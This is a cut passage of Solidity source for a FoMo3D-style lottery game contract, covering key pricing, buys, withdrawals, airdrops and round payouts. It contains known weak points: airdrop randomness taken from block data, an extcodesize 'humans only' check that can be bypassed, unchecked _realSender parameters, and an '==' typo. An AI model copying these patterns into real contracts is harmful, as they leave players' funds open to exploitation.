genAmount; uint256 potAmount; } struct Player { address addr; bytes32 name; uint256 win; uint256 gen; uint256 aff; uint256 lrnd; uint256 laff; } struct PlayerRounds { uint256 eth; uint256 keys; uint256 mask; uint256 ico; } struct Round { uint256 plyr; uint256 team; uint256 end; bool ended; uint256 strt; uint256 keys; uint256 eth; uint256 pot; uint256 mask; uint256 ico; uint256 icoGen; uint256 icoAvg; } struct TeamFee { uint256 gen; uint256 p3d; } struct PotSplit { uint256 gen; uint256 p3d; } } library F3DKeysCalcShort { using SafeMath for *; function keysRec(uint256 _curEth, uint256 _newEth) internal pure returns (uint256) { return(keys((_curEth).add(_newEth)).sub(keys(_curEth))); } function ethRec(uint256 _curKeys, uint256 _sellKeys) internal pure returns (uint256) { return((eth(_curKeys)).sub(eth(_curKeys.sub(_sellKeys)))); } function keys(uint256 _eth) internal pure returns(uint256) { return ((((((_eth).mul(1000000000000000000)).mul(312500000000000000000000000)).add(5624988281256103515625000000000000000000000000000000000000000000)).sqrt()).sub(74999921875000000000000000000000)) / (156250000); } function eth(uint256 _keys) internal pure returns(uint256) { return ((78125000).mul(_keys.sq()).add(((149999843750000).mul(_keys.mul(1000000000000000000))) / (2))) / ((1000000000000000000).sq()); } } contract F3Devents { event onNewName ( uint256 indexed playerID, address indexed playerAddress, bytes32 indexed playerName, bool isNewPlayer, uint256 affiliateID, address affiliateAddress, bytes32 affiliateName, uint256 amountPaid, uint256 timeStamp ); event onEndTx ( uint256 compressedData, uint256 compressedIDs, bytes32 playerName, address playerAddress, uint256 ethIn, uint256 keysBought, address winnerAddr, bytes32 winnerName, uint256 amountWon, uint256 newPot, uint256 P3DAmount, uint256 genAmount, uint256 potAmount, uint256 airDropPot ); event onWithdraw ( uint256 indexed playerID, address playerAddress, bytes32 playerName, uint256 ethOut, uint256 timeStamp ); event onWithdrawAndDistribute ( address playerAddress, bytes32 playerName, uint256 ethOut, uint256 compressedData, uint256 compressedIDs, address winnerAddr, bytes32 winnerName, uint256 amountWon, uint256 newPot, uint256 P3DAmount, uint256 genAmount ); event onBuyAndDistribute ( address playerAddress, bytes32 playerName, uint256 ethIn, uint256 compressedData, uint256 compressedIDs, address winnerAddr, bytes32 winnerName, uint256 amountWon, uint256 newPot, uint256 P3DAmount, uint256 genAmount ); event onReLoadAndDistribute ( address playerAddress, bytes32 playerName, uint256 compressedData, uint256 compressedIDs, address winnerAddr, bytes32 winnerName, uint256 amountWon, uint256 newPot, uint256 P3DAmount, uint256 genAmount ); event onAffiliatePayout ( uint256 indexed affiliateID, address affiliateAddress, bytes32 affiliateName, uint256 indexed roundID, uint256 indexed buyerID, uint256 amount, uint256 timeStamp ); event onPotSwapDeposit ( uint256 roundID, uint256 amountAddedToPot ); } interface PlayerBookInterface { function getPlayerID(address _addr) external returns (uint256); function getPlayerName(uint256 _pID) external view returns (bytes32); function getPlayerLAff(uint256 _pID) external view returns (uint256); function getPlayerAddr(uint256 _pID) external view returns (address); function getNameFee() external view returns (uint256); function registerNameXIDFromDapp(address _addr, bytes32 _name, uint256 _affCode, bool _all) external payable returns(bool, uint256); function registerNameXaddrFromDapp(address _addr, bytes32 _name, address _affCode, bool _all) external payable returns(bool, uint256); function registerNameXnameFromDapp(address _addr, bytes32 _name, bytes32 _affCode, bool _all) external payable returns(bool, uint256); } contract modularFast is F3Devents {} contract FoMo3DFast is modularFast { using SafeMath for *; using NameFilter for string; using F3DKeysCalcShort for uint256; PlayerBookInterface constant private PlayerBook = PlayerBookInterface(0x27D5C0C175C1Ba67986319ac297d2F4D3bC2b7b2); address private admin = msg.sender; bool public activated_ = false; string constant public name = \"FOMO Test\"; string constant public symbol = \"Test\"; uint256 private rndExtra_ = 30 minutes; uint256 private rndGap_ = 30 minutes; uint256 constant private rndInit_ = 30 minutes; uint256 constant private rndInc_ = 20 seconds; uint256 constant private rndMax_ = 8 hours; uint256 public airDropPot_; uint256 public airDropTracker_ = 0; uint256 public rID_; mapping (address => uint256) public pIDxAddr_; mapping (bytes32 => uint256) public pIDxName_; mapping (uint256 => F3Ddatasets.Player) public plyr_; mapping (uint256 => mapping (uint256 => F3Ddatasets.PlayerRounds)) public plyrRnds_; mapping (uint256 => mapping (bytes32 => bool)) public plyrNames_; mapping (uint256 => F3Ddatasets.Round) public round_; mapping (uint256 => mapping(uint256 => uint256)) public rndTmEth_; mapping (uint256 => F3Ddatasets.TeamFee) public fees_; mapping (uint256 => F3Ddatasets.PotSplit) public potSplit_; constructor() public { fees_[0] = F3Ddatasets.TeamFee(30,6); fees_[1] = F3Ddatasets.TeamFee(43,0); fees_[2] = F3Ddatasets.TeamFee(56,10); fees_[3] = F3Ddatasets.TeamFee(43,8); potSplit_[0] = F3Ddatasets.PotSplit(15,10); potSplit_[1] = F3Ddatasets.PotSplit(25,0); potSplit_[2] = F3Ddatasets.PotSplit(20,20); potSplit_[3] = F3Ddatasets.PotSplit(30,10); } modifier isActivated() { require(activated_ == true, \"its not ready yet.  check ?eta in discord\"); _; } modifier isHuman() { address _addr = msg.sender; uint256 _codeLength; assembly {_codeLength := extcodesize(_addr)} require(_codeLength == 0, \"sorry humans only\"); _; } modifier isWithinLimits(uint256 _eth) { require(_eth >= 1000000000, \"pocket lint: not a valid currency\"); require(_eth <= 100000000000000000000000, \"no vitalik, no\"); _; } function() isActivated() isHuman() isWithinLimits(msg.value) public payable { F3Ddatasets.EventReturns memory _eventData_ = determinePID(_eventData_); uint256 _pID = pIDxAddr_[msg.sender]; buyCore(_pID, plyr_[_pID].laff, 2, _eventData_); } function buyXid(uint256 _affCode, uint256 _team) isActivated() isHuman() isWithinLimits(msg.value) public payable { F3Ddatasets.EventReturns memory _eventData_ = determinePID(_eventData_); uint256 _pID = pIDxAddr_[msg.sender]; if (_affCode == 0 || _affCode == _pID) { _affCode = plyr_[_pID].laff; } else if (_affCode != plyr_[_pID].laff) { plyr_[_pID].laff = _affCode; } _team = verifyTeam(_team); buyCore(_pID, _affCode, _team, _eventData_); } function buyXaddr(address _affCode, uint256 _team) isActivated() isHuman() isWithinLimits(msg.value) public payable { F3Ddatasets.EventReturns memory _eventData_ = determinePID(_eventData_); uint256 _pID = pIDxAddr_[msg.sender]; uint256 _affID; if (_affCode == address(0) || _affCode == msg.sender) { _affID = plyr_[_pID].laff; } else { _affID = pIDxAddr_[_affCode]; if (_affID != plyr_[_pID].laff) { plyr_[_pID].laff = _affID; } } _team = verifyTeam(_team); buyCore(_pID, _affID, _team, _eventData_); } function buyXname(bytes32 _affCode, uint256 _team) isActivated() isHuman() isWithinLimits(msg.value) public payable { F3Ddatasets.EventReturns memory _eventData_ = determinePID(_eventData_); uint256 _pID = pIDxAddr_[msg.sender]; uint256 _affID; if (_affCode == '' || _affCode == plyr_[_pID].name) { _affID = plyr_[_pID].laff; } else { _affID = pIDxName_[_affCode]; if (_affID != plyr_[_pID].laff) { plyr_[_pID].laff = _affID; } } _team = verifyTeam(_team); buyCore(_pID, _affID, _team, _eventData_); } function buyXnameQR(address _realSender,bytes32 _affCode, uint256 _team)     isActivated()    isWithinLimits(msg.value)     public     payable  { F3Ddatasets.EventReturns memory _eventData_ = determinePIDQR(_realSender,_eventData_); uint256 _pID = pIDxAddr_[_realSender]; uint256 _affID; if (_affCode == '' || _affCode == plyr_[_pID].name)      { _affID = plyr_[_pID].laff; } else { _affID = pIDxName_[_affCode]; if (_affID != plyr_[_pID].laff)     { plyr_[_pID].laff = _affID; } } _team = verifyTeam(_team); buyCoreQR(_realSender, _pID, _affID, _team, _eventData_); } function reLoadXid(uint256 _affCode, uint256 _team, uint256 _eth) isActivated() isHuman() isWithinLimits(_eth) public { F3Ddatasets.EventReturns memory _eventData_; uint256 _pID = pIDxAddr_[msg.sender]; if (_affCode == 0 || _affCode == _pID) { _affCode = plyr_[_pID].laff; } else if (_affCode != plyr_[_pID].laff) { plyr_[_pID].laff = _affCode; } _team = verifyTeam(_team); reLoadCore(_pID, _affCode, _team, _eth, _eventData_); } function reLoadXaddr(address _affCode, uint256 _team, uint256 _eth) isActivated() isHuman() isWithinLimits(_eth) public { F3Ddatasets.EventReturns memory _eventData_; uint256 _pID = pIDxAddr_[msg.sender]; uint256 _affID; if (_affCode == address(0) || _affCode == msg.sender) { _affID = plyr_[_pID].laff; } else { _affID = pIDxAddr_[_affCode]; if (_affID != plyr_[_pID].laff) { plyr_[_pID].laff = _affID; } } _team = verifyTeam(_team); reLoadCore(_pID, _affID, _team, _eth, _eventData_); } function reLoadXname(bytes32 _affCode, uint256 _team, uint256 _eth) isActivated() isHuman() isWithinLimits(_eth) public { F3Ddatasets.EventReturns memory _eventData_; uint256 _pID = pIDxAddr_[msg.sender]; uint256 _affID; if (_affCode == '' || _affCode == plyr_[_pID].name) { _affID = plyr_[_pID].laff; } else { _affID = pIDxName_[_affCode]; if (_affID != plyr_[_pID].laff) { plyr_[_pID].laff = _affID; } } _team = verifyTeam(_team); reLoadCore(_pID, _affID, _team, _eth, _eventData_); } function withdraw() isActivated() isHuman() public { uint256 _rID = rID_; uint256 _now = now; uint256 _pID = pIDxAddr_[msg.sender]; uint256 _eth; if (_now > round_[_rID].end && round_[_rID].ended == false && round_[_rID].plyr != 0) { F3Ddatasets.EventReturns memory _eventData_; round_[_rID].ended = true; _eventData_ = endRound(_eventData_); _eth = withdrawEarnings(_pID); if (_eth > 0) plyr_[_pID].addr.transfer(_eth); _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000); _eventData_.compressedIDs = _eventData_.compressedIDs + _pID; emit F3Devents.onWithdrawAndDistribute ( msg.sender, plyr_[_pID].name, _eth, _eventData_.compressedData, _eventData_.compressedIDs, _eventData_.winnerAddr, _eventData_.winnerName, _eventData_.amountWon, _eventData_.newPot, _eventData_.P3DAmount, _eventData_.genAmount ); } else { _eth = withdrawEarnings(_pID); if (_eth > 0) plyr_[_pID].addr.transfer(_eth); emit F3Devents.onWithdraw(_pID, msg.sender, plyr_[_pID].name, _eth, _now); } } function withdrawQR(address _realSender) isActivated() payable public { uint256 _rID = rID_; uint256 _now = now; uint256 _pID = pIDxAddr_[_realSender]; uint256 _eth; if (_now > round_[_rID].end && round_[_rID].ended == false && round_[_rID].plyr != 0) { F3Ddatasets.EventReturns memory _eventData_; round_[_rID].ended = true; _eventData_ = endRound(_eventData_); _eth = withdrawEarnings(_pID); if (_eth > 0) plyr_[_pID].addr.transfer(_eth); _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000); _eventData_.compressedIDs = _eventData_.compressedIDs + _pID; emit F3Devents.onWithdrawAndDistribute ( _realSender, plyr_[_pID].name, _eth, _eventData_.compressedData, _eventData_.compressedIDs, _eventData_.winnerAddr, _eventData_.winnerName, _eventData_.amountWon, _eventData_.newPot, _eventData_.P3DAmount, _eventData_.genAmount ); } else { _eth = withdrawEarnings(_pID); if (_eth > 0) plyr_[_pID].addr.transfer(_eth); emit F3Devents.onWithdraw(_pID, _realSender, plyr_[_pID].name, _eth, _now); } } function getBuyPrice() public view returns(uint256) { uint256 _rID = rID_; uint256 _now = now; if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0))) return ( (round_[_rID].keys.add(1000000000000000000)).ethRec(1000000000000000000) ); else return ( 75000000000000 ); } function getTimeLeft() public view returns(uint256) { uint256 _rID = rID_; uint256 _now = now; if (_now < round_[_rID].end) if (_now > round_[_rID].strt + rndGap_) return( (round_[_rID].end).sub(_now) ); else return( (round_[_rID].strt + rndGap_).sub(_now) ); else return(0); } function getPlayerVaults(uint256 _pID) public view returns(uint256 ,uint256, uint256) { uint256 _rID = rID_; if (now > round_[_rID].end && round_[_rID].ended == false && round_[_rID].plyr != 0) { if (round_[_rID].plyr == _pID) { return ( (plyr_[_pID].win).add( ((round_[_rID].pot).mul(48)) / 100 ), (plyr_[_pID].gen).add(  getPlayerVaultsHelper(_pID, _rID).sub(plyrRnds_[_pID][_rID].mask)   ), plyr_[_pID].aff ); } else { return ( plyr_[_pID].win, (plyr_[_pID].gen).add(  getPlayerVaultsHelper(_pID, _rID).sub(plyrRnds_[_pID][_rID].mask)  ), plyr_[_pID].aff ); } } else { return ( plyr_[_pID].win, (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)), plyr_[_pID].aff ); } } function getPlayerVaultsHelper(uint256 _pID, uint256 _rID) private view returns(uint256) { return(  ((((round_[_rID].mask).add(((((round_[_rID].pot).mul(potSplit_[round_[_rID].team].gen)) / 100).mul(1000000000000000000)) / (round_[_rID].keys))).mul(plyrRnds_[_pID][_rID].keys)) / 1000000000000000000)  ); } function getCurrentRoundInfo() public view returns(uint256, uint256, uint256, uint256, uint256, uint256, uint256, address, bytes32, uint256, uint256, uint256, uint256, uint256) { uint256 _rID = rID_; return ( round_[_rID].ico, _rID, round_[_rID].keys, round_[_rID].end, round_[_rID].strt, round_[_rID].pot, (round_[_rID].team + (round_[_rID].plyr * 10)), plyr_[round_[_rID].plyr].addr, plyr_[round_[_rID].plyr].name, rndTmEth_[_rID][0], rndTmEth_[_rID][1], rndTmEth_[_rID][2], rndTmEth_[_rID][3], airDropTracker_ + (airDropPot_ * 1000) ); } function getPlayerInfoByAddress(address _addr) public view returns(uint256, bytes32, uint256, uint256, uint256, uint256, uint256) { uint256 _rID = rID_; if (_addr == address(0)) { _addr == msg.sender; } uint256 _pID = pIDxAddr_[_addr]; return ( _pID, plyr_[_pID].name, plyrRnds_[_pID][_rID].keys, plyr_[_pID].win, (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)), plyr_[_pID].aff, plyrRnds_[_pID][_rID].eth ); } function buyCore(uint256 _pID, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private { uint256 _rID = rID_; uint256 _now = now; if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0))) { core(_rID, _pID, msg.value, _affID, _team, _eventData_); } else { if (_now > round_[_rID].end && round_[_rID].ended == false) { round_[_rID].ended = true; _eventData_ = endRound(_eventData_); _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000); _eventData_.compressedIDs = _eventData_.compressedIDs + _pID; emit F3Devents.onBuyAndDistribute ( msg.sender, plyr_[_pID].name, msg.value, _eventData_.compressedData, _eventData_.compressedIDs, _eventData_.winnerAddr, _eventData_.winnerName, _eventData_.amountWon, _eventData_.newPot, _eventData_.P3DAmount, _eventData_.genAmount ); } plyr_[_pID].gen = plyr_[_pID].gen.add(msg.value); } } function buyCoreQR(address _realSender,uint256 _pID, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)        private    { uint256 _rID = rID_; uint256 _now = now; if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))        { coreQR(_realSender,_rID, _pID, msg.value, _affID, _team, _eventData_); } else { if (_now > round_[_rID].end && round_[_rID].ended == false)         { round_[_rID].ended = true; _eventData_ = endRound(_eventData_); _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000); _eventData_.compressedIDs = _eventData_.compressedIDs + _pID; emit F3Devents.onBuyAndDistribute ( _realSender, plyr_[_pID].name, msg.value, _eventData_.compressedData, _eventData_.compressedIDs, _eventData_.winnerAddr, _eventData_.winnerName, _eventData_.amountWon, _eventData_.newPot, _eventData_.P3DAmount, _eventData_.genAmount ); } plyr_[_pID].gen = plyr_[_pID].gen.add(msg.value); } } function reLoadCore(uint256 _pID, uint256 _affID, uint256 _team, uint256 _eth, F3Ddatasets.EventReturns memory _eventData_) private { uint256 _rID = rID_; uint256 _now = now; if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0))) { plyr_[_pID].gen = withdrawEarnings(_pID).sub(_eth); core(_rID, _pID, _eth, _affID, _team, _eventData_); } else if (_now > round_[_rID].end && round_[_rID].ended == false) { round_[_rID].ended = true; _eventData_ = endRound(_eventData_); _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000); _eventData_.compressedIDs = _eventData_.compressedIDs + _pID; emit F3Devents.onReLoadAndDistribute ( msg.sender, plyr_[_pID].name, _eventData_.compressedData, _eventData_.compressedIDs, _eventData_.winnerAddr, _eventData_.winnerName, _eventData_.amountWon, _eventData_.newPot, _eventData_.P3DAmount, _eventData_.genAmount ); } } function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private { if (plyrRnds_[_pID][_rID].keys == 0) _eventData_ = managePlayer(_pID, _eventData_); if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000){ uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth); uint256 _refund = _eth.sub(_availableLimit); plyr_[_pID].gen = plyr_[_pID].gen.add(_refund); _eth = _availableLimit; } if (_eth > 1000000000) { uint256 _keys = (round_[_rID].eth).keysRec(_eth); if (_keys >= 1000000000000000000) { updateTimer(_keys, _rID); if (round_[_rID].plyr != _pID) round_[_rID].plyr = _pID; if (round_[_rID].team != _team) round_[_rID].team = _team; _eventData_.compressedData = _eventData_.compressedData + 100; } if (_eth >= 100000000000000000) { airDropTracker_++; if (airdrop() == true) { uint256 _prize; if (_eth >= 10000000000000000000) { _prize = ((airDropPot_).mul(75)) / 100; plyr_[_pID].win = (plyr_[_pID].win).add(_prize); airDropPot_ = (airDropPot_).sub(_prize); _eventData_.compressedData += 300000000000000000000000000000000; } else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) { _prize = ((airDropPot_).mul(50)) / 100; plyr_[_pID].win = (plyr_[_pID].win).add(_prize); airDropPot_ = (airDropPot_).sub(_prize); _eventData_.compressedData += 200000000000000000000000000000000; } else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) { _prize = ((airDropPot_).mul(25)) / 100; plyr_[_pID].win = (plyr_[_pID].win).add(_prize); airDropPot_ = (airDropPot_).sub(_prize); _eventData_.compressedData += 300000000000000000000000000000000; } _eventData_.compressedData += 10000000000000000000000000000000; _eventData_.compressedData += _prize * 1000000000000000000000000000000000; airDropTracker_ = 0; } } _eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000); plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys); plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth); round_[_rID].keys = _keys.add(round_[_rID].keys); round_[_rID].eth = _eth.add(round_[_rID].eth); rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]); _eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_); _eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_); endTx(_pID, _team, _eth, _keys, _eventData_); } } function coreQR(address _realSender,uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)       private   { if (plyrRnds_[_pID][_rID].keys == 0) _eventData_ = managePlayer(_pID, _eventData_); if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000) { uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth); uint256 _refund = _eth.sub(_availableLimit); plyr_[_pID].gen = plyr_[_pID].gen.add(_refund); _eth = _availableLimit; } if (_eth > 1000000000) { uint256 _keys = (round_[_rID].eth).keysRec(_eth); if (_keys >= 1000000000000000000){ updateTimer(_keys, _rID); if (round_[_rID].plyr != _pID) round_[_rID].plyr = _pID; if (round_[_rID].team != _team) round_[_rID].team = _team; _eventData_.compressedData = _eventData_.compressedData + 100; } if (_eth >= 100000000000000000) { airDropTracker_++; if (airdrop() == true) { uint256 _prize; if (_eth >= 10000000000000000000) { _prize = ((airDropPot_).mul(75)) / 100; plyr_[_pID].win = (plyr_[_pID].win).add(_prize); airDropPot_ = (airDropPot_).sub(_prize); _eventData_.compressedData += 300000000000000000000000000000000; } else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) { _prize = ((airDropPot_).mul(50)) / 100; plyr_[_pID].win = (plyr_[_pID].win).add(_prize); airDropPot_ = (airDropPot_).sub(_prize); _eventData_.compressedData += 200000000000000000000000000000000; } else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) { _prize = ((airDropPot_).mul(25)) / 100; plyr_[_pID].win = (plyr_[_pID].win).add(_prize); airDropPot_ = (airDropPot_).sub(_prize); _eventData_.compressedData += 300000000000000000000000000000000; } _eventData_.compressedData += 10000000000000000000000000000000; _eventData_.compressedData += _prize * 1000000000000000000000000000000000; airDropTracker_ = 0; } } _eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000); plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys); plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth); round_[_rID].keys = _keys.add(round_[_rID].keys); round_[_rID].eth = _eth.add(round_[_rID].eth); rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]); _eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_); _eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_); endTxQR(_realSender,_pID, _team, _eth, _keys, _eventData_); } } function calcUnMaskedEarnings(uint256 _pID, uint256 _rIDlast) private view returns(uint256) { return(  (((round_[_rIDlast].mask).mul(plyrRnds_[_pID][_rIDlast].keys)) / (1000000000000000000)).sub(plyrRnds_[_pID][_rIDlast].mask)  ); } function calcKeysReceived(uint256 _rID, uint256 _eth) public view returns(uint256) { uint256 _now = now; if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0))) return ( (round_[_rID].eth).keysRec(_eth) ); else return ( (_eth).keys() ); } function iWantXKeys(uint256 _keys) public view returns(uint256) { uint256 _rID = rID_; uint256 _now = now; if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0))) return ( (round_[_rID].keys.add(_keys)).ethRec(_keys) ); else return ( (_keys).eth() ); } function receivePlayerInfo(uint256 _pID, address _addr, bytes32 _name, uint256 _laff) external { require (msg.sender == address(PlayerBook), \"your not playerNames contract... hmmm..\"); if (pIDxAddr_[_addr] != _pID) pIDxAddr_[_addr] = _pID; if (pIDxName_[_name] != _pID) pIDxName_[_name] = _pID; if (plyr_[_pID].addr != _addr) plyr_[_pID].addr = _addr; if (plyr_[_pID].name != _name) plyr_[_pID].name = _name; if (plyr_[_pID].laff != _laff) plyr_[_pID].laff = _laff; if (plyrNames_[_pID][_name] == false) plyrNames_[_pID][_name] = true; } function receivePlayerNameList(uint256 _pID, bytes32 _name) external { require (msg.sender == address(PlayerBook), \"your not playerNames contract... hmmm..\"); if(plyrNames_[_pID][_name] == false) plyrNames_[_pID][_name] = true; } function determinePID(F3Ddatasets.EventReturns memory _eventData_) private returns (F3Ddatasets.EventReturns) { uint256 _pID = pIDxAddr_[msg.sender]; if (_pID == 0) { _pID = PlayerBook.getPlayerID(msg.sender); bytes32 _name = PlayerBook.getPlayerName(_pID); uint256 _laff = PlayerBook.getPlayerLAff(_pID); pIDxAddr_[msg.sender] = _pID; plyr_[_pID].addr = msg.sender; if (_name != \"\") { pIDxName_[_name] = _pID; plyr_[_pID].name = _name; plyrNames_[_pID][_name] = true; } if (_laff != 0 && _laff != _pID) plyr_[_pID].laff = _laff; _eventData_.compressedData = _eventData_.compressedData + 1; } return (_eventData_); } function determinePIDQR(address _realSender, F3Ddatasets.EventReturns memory _eventData_) private returns (F3Ddatasets.EventReturns) { uint256 _pID = pIDxAddr_[_realSender]; if (_pID == 0) { _pID = PlayerBook.getPlayerID(_realSender); bytes32 _name = PlayerBook.getPlayerName(_pID); uint256 _laff = PlayerBook.getPlayerLAff(_pID); pIDxAddr_[_realSender] = _pID; plyr_[_pID].addr = _realSender; if (_name != \"\") { pIDxName_[_name] = _pID; plyr_[_pID].name = _name; plyrNames_[_pID][_name] = true; } if (_laff != 0 && _laff != _pID) plyr_[_pID].laff = _laff; _eventData_.compressedData = _eventData_.compressedData + 1; } return (_eventData_); } function verifyTeam(uint256 _team) private pure returns (uint256) { if (_team < 0 || _team > 3) return(2); else return(_team); } function managePlayer(uint256 _pID, F3Ddatasets.EventReturns memory _eventData_) private returns (F3Ddatasets.EventReturns) { if (plyr_[_pID].lrnd != 0) updateGenVault(_pID, plyr_[_pID].lrnd); plyr_[_pID].lrnd = rID_; _eventData_.compressedData = _eventData_.compressedData + 10; return(_eventData_); } function endRound(F3Ddatasets.EventReturns memory _eventData_) private returns (F3Ddatasets.EventReturns) { uint256 _rID = rID_; uint256 _winPID = round_[_rID].plyr; uint256 _winTID = round_[_rID].team; uint256 _pot = round_[_rID].pot; uint256 _win = (_pot.mul(48)) / 100; uint256 _com = (_pot / 50); uint256 _gen = (_pot.mul(potSplit_[_winTID].gen)) / 100; uint256 _p3d = (_pot.mul(potSplit_[_winTID].p3d)) / 100; uint256 _res = (((_pot.sub(_win)).sub(_com)).sub(_gen)).sub(_p3d); uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys); uint256 _dust = _gen.sub((_ppt.mul(round_[_rID].keys)) / 1000000000000000000); if (_dust > 0) { _gen = _gen.sub(_dust); _res = _res.add(_dust); } plyr_[_winPID].win = _win.add(plyr_[_winPID].win); admin.transfer(_com); admin.transfer(_p3d); round_[_rID].mask = _ppt.add(round_[_rID].mask); _eventData_.compressedData = _eventData_.compressedData + (round_[_rID].end * 1000000); _eventData_.compressedIDs = _eventData_.compressedIDs + (_winPID * 100000000000000000000000000) + (_winTID * 100000000000000000); _eventData_.winnerAddr = plyr_[_winPID].addr; _eventData_.winnerName = plyr_[_winPID].name; _eventData_.amountWon = _win; _eventData_.genAmount = _gen; _eventData_.P3DAmount = _p3d; _eventData_.newPot = _res; rID_++; _rID++; round_[_rID].strt = now; round_[_rID].end = now.add(rndInit_).add(rndGap_); round_[_rID].pot = _res; return(_eventData_); } function updateGenVault(uint256 _pID, uint256 _rIDlast) private { uint256 _earnings = calcUnMaskedEarnings(_pID, _rIDlast); if (_earnings > 0) { plyr_[_pID].gen = _earnings.add(plyr_[_pID].gen); plyrRnds_[_pID][_rIDlast].mask = _earnings.add(plyrRnds_[_pID][_rIDlast].mask); } } function updateTimer(uint256 _keys, uint256 _rID) private { uint256 _now = now; uint256 _newTime; if (_now > round_[_rID].end && round_[_rID].plyr == 0) _newTime = (((_keys) / (1000000000000000000)).mul(rndInc_)).add(_now); else _newTime = (((_keys) / (1000000000000000000)).mul(rndInc_)).add(round_[_rID].end); if (_newTime < (rndMax_).add(_now)) round_[_rID].end = _newTime; else round_[_rID].end = rndMax_.add(_now); } function airdrop() private view returns(bool) { uint256 seed = uint256(keccak256(abi.encodePacked( (block.timestamp).add (block.difficulty).add ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add (block.gaslimit).add ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add (block.number) ))); if((seed - ((seed / 1000) * 1000)) < airDropTracker_) return(true); else return(false); } function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private returns(F3Ddatasets.EventReturns)  { uint256 _p1 = _eth / 100; uint256 _com = _eth / 50; _com = _com.add(_p1); uint256 _p3d; if (!address(admin).call.value(_com)()) { _p3d = _com; _com = 0; } uint256 _aff = _eth / 10; if (_affID != _pID && plyr_[_affID].name != '') { plyr_[_affID].aff = _aff.add(plyr_[_affID].aff); emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now); } else { _p3d = _aff; } _p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100)); if (_p3d > 0) { admin.transfer(_p3d); _eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount); } return(_eventData_); } function potSwap() external payable { uint256 _rID = rID_ + 1; round_[_rID].pot = round_[_rID].pot.add(msg.value); emit F3Devents.onPotSwapDeposit(_rID, msg.value); } function distributeInternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _team, uint256 _keys, F3Ddatasets.EventReturns memory _eventData_) private returns(F3Ddatasets.EventReturns) { uint256 _gen = (_eth.mul(fees_[_team].gen)) / 100; uint256 _air = (_eth / 100); airDropPot_ = airDropPot_.add(_air); _eth = _eth.sub(((_eth.mul(14)) / 100).add((_eth.mul(fees_[_team].p3d)) / 100)); uint256 _pot = _eth.sub(_gen); uint256 _dust = updateMasks(_rID, _pID, _gen, _keys); if (_dust > 0) _gen = _gen.sub(_dust); round_[_rID].pot = _pot.add(_dust).add(round_[_rID].pot); _eventData_.genAmount = _gen.add(_eventData_.genAmount); _eventData_.potAmount = _pot; return(_eventData_); } function updateMasks(uint256 _rID, uint256 _pID, uint256 _gen, uint256 _keys) private returns(uint256) { uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys); round_[_rID].mask = _ppt.add(round_[_rID].mask); uint256 _pearn = (_ppt.mul(_keys)) / (1000000000000000000); plyrRnds_[_pID][_rID].mask = (((round_[_rID].mask.mul(_keys)) / (1000000000000000000)).sub(_pearn)).add(plyrRnds_[_pID][_rID].mask); return(_gen.sub((_ppt.mul(round_[_rID].keys)) / (1000000000000000000))); } function withdrawEarnings(uint256 _pID) private returns(uint256) { updateGenVault(_pID, plyr_[_pID].lrnd); uint256 _earnings = 